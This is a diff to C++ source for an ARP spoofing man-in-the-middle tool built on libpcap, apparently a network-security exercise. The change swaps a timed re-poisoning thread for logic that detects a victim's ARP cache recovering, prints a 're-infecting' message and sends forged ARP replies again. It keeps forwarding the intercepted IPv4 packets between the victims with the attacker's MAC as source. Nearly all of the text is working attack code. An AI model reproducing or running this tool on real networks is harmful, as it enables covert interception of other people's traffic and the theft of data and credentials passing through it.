@@ -111,17 +111,6 @@ void sendArpReply(pcap_t* handle, Ip sender_ip, Ip target_ip, Mac sender_mac) {
     pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 }
 
-void* reinfectThread(void* arg) {
-    ThreadArg* ta = (ThreadArg*)arg;
-    while (true) {
-        sleep(10);
-        for (const Flow& f : *(ta->flows)) {
-            sendArpReply(ta->handle, f.sender_ip, f.target_ip, f.sender_mac);
-        }
-    }
-    return nullptr;
-}
-
 int main(int argc, char* argv[]) {
     if (argc < 4 || argc % 2 != 0) {
         printf("syntax: %s <interface> <sender ip 1> <target ip 1> [...]", argv[0]);
@@ -156,29 +145,36 @@ int main(int argc, char* argv[]) {
         flows.push_back({sender_ip, target_ip, sender_mac, target_mac});
     }
 
-    ThreadArg thread_arg = {handle, &flows};
-    pthread_t t;
-    pthread_create(&t, nullptr, reinfectThread, &thread_arg);
-
     while (true) {
         struct pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(handle, &header, &packet);
         if (res != 1) continue;
-        EthHdr* eth_hdr = (EthHdr*)packet;
-        if (eth_hdr->type() != EthHdr::Ip4) continue;
 
-        IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
-        for (const Flow& f : flows) {
-            if (ip_hdr->sip() == f.sender_ip) {
-                eth_hdr->dmac_ = f.target_mac;
-                eth_hdr->smac_ = Mac(attacker_mac);
-                pcap_sendpacket(handle, packet, header->caplen);
+        EthHdr* eth_hdr = (EthHdr*)packet;
+        if (eth_hdr->type() == EthHdr::Arp) {
+            ArpHdr* arp_hdr = (ArpHdr*)(packet + sizeof(EthHdr));
+            for (Flow& f : flows) {
+                if ((arp_hdr->sip() == f.sender_ip && arp_hdr->tip() == f.target_ip && arp_hdr->tmac() == f.target_mac) ||
+                    (arp_hdr->sip() == f.target_ip && arp_hdr->tip() == f.sender_ip && arp_hdr->tmac() == f.sender_mac)) {
+                    printf("[!] Detected ARP recovery from sender %s, re-infecting...\n", std::string(f.sender_ip).c_str());
+                    sendArpReply(handle, f.sender_ip, f.target_ip, f.sender_mac);
+                }
             }
-            else if (ip_hdr->dip() == f.sender_ip) {
-                eth_hdr->dmac_ = f.sender_mac;
-                eth_hdr->smac_ = Mac(attacker_mac);
-                pcap_sendpacket(handle, packet, header->caplen);
+        }
+        else if (eth_hdr->type() == EthHdr::Ip4) {
+            IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
+            for (const Flow& f : flows) {
+                if (ip_hdr->sip() == f.sender_ip) {
+                    eth_hdr->dmac_ = f.target_mac;
+                    eth_hdr->smac_ = Mac(attacker_mac);
+                    pcap_sendpacket(handle, packet, header->caplen);
+                }
+                else if (ip_hdr->dip() == f.sender_ip) {
+                    eth_hdr->dmac_ = f.sender_mac;
+                    eth_hdr->smac_ = Mac(attacker_mac);
+                    pcap_sendpacket(handle, packet, header->caplen);
+                }
             }
         }
     }
